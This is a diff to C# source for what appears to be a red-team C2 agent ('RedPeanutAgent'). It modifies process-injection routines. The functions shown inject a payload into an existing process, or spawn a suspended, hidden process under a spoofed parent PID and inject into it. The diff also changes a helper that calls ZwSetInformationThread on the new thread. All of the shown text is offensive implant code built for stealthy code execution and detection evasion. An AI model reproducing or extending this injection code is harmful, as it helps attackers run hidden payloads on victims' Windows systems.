@@ -22,7 +22,7 @@ namespace RedPeanutAgent.Execution
                 retVal = true;
             }
             Natives.CloseHandle(hproc);
-            return !retVal;            
+            return !retVal;
         }
 
         public static bool OpenAndInject(int pid, byte[] payload)
@@ -122,11 +122,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
-            if (infoth == IntPtr.Zero)
-            {
-                return false;
-            }
+            InjectionHelper.SetInformationThread(procInfo);
 
             InjectionHelper.ResumeThread(procInfo);
 
@@ -139,7 +135,7 @@ namespace RedPeanutAgent.Execution
         public static bool SapwnAndInjectPPID(string binary, byte[] payload, int ppid)
         {
             Natives.PROCESS_INFORMATION procInfo = new Natives.PROCESS_INFORMATION();
-            Natives.CreationFlags flags = Natives.CreationFlags.CREATE_SUSPENDED | Natives.CreationFlags.DETACHED_PROCESS 
+            Natives.CreationFlags flags = Natives.CreationFlags.CREATE_SUSPENDED | Natives.CreationFlags.DETACHED_PROCESS
                 | Natives.CreationFlags.CREATE_NO_WINDOW | Natives.CreationFlags.EXTENDED_STARTUPINFO_PRESENT;
 
             if (!Spawner.CreateProcess(binary, ppid, flags, ref procInfo))
@@ -190,11 +186,7 @@ namespace RedPeanutAgent.Execution
                 return false;
             }
 
-            IntPtr infoth = InjectionHelper.SetInformationThread(procInfo);
-            if (infoth == IntPtr.Zero)
-            {
-                return false;
-            }
+            InjectionHelper.SetInformationThread(procInfo);
 
             InjectionHelper.ResumeThread(procInfo);
 
@@ -207,12 +199,12 @@ namespace RedPeanutAgent.Execution
         public static IntPtr OpenProcess(int pid)
         {
             IntPtr procHandle = Natives.OpenProcess(
-                Natives.ProcessAccessFlags.CreateThread | 
+                Natives.ProcessAccessFlags.CreateThread |
                 Natives.ProcessAccessFlags.QueryInformation |
                Natives.ProcessAccessFlags.VirtualMemoryOperation |
                Natives.ProcessAccessFlags.VirtualMemoryWrite |
-               Natives.ProcessAccessFlags.VirtualMemoryRead, 
-                false, 
+               Natives.ProcessAccessFlags.VirtualMemoryRead,
+                false,
                 pid);
             return procHandle;
         }
@@ -270,12 +262,14 @@ namespace RedPeanutAgent.Execution
             return true;
         }
 
-        public static IntPtr SetInformationThread(Natives.PROCESS_INFORMATION procInfo)
+        public static bool SetInformationThread(Natives.PROCESS_INFORMATION procInfo)
         {
             IntPtr th = procInfo.hThread;
-            IntPtr infoth = Natives.ZwSetInformationThread(th, 1, IntPtr.Zero, 0);
-
-            return infoth;
+            if (Natives.ZwSetInformationThread(th, (uint)Natives.SYSTEM_INFORMATION_CLASS.SystemProcessorInformation, IntPtr.Zero, 0) != 0)
+            {
+                return false;
+            }
+            return true;
         }
 
         public static int ResumeThread(Natives.PROCESS_INFORMATION procInfo)
